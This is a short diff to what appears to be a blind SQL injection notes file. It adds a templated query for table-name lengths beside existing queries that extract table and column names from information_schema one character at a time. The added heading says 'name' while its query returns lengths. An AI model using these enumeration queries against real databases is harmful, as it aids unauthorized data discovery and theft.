@@ -167,7 +167,10 @@ SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSE
 ```
 SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE();
 ```
-
+**Find the name of all tables:**  
+```
+SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT {i},1;
+```
 **Find Column Names:**  
 ```sql 
 SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 3),1,1);  
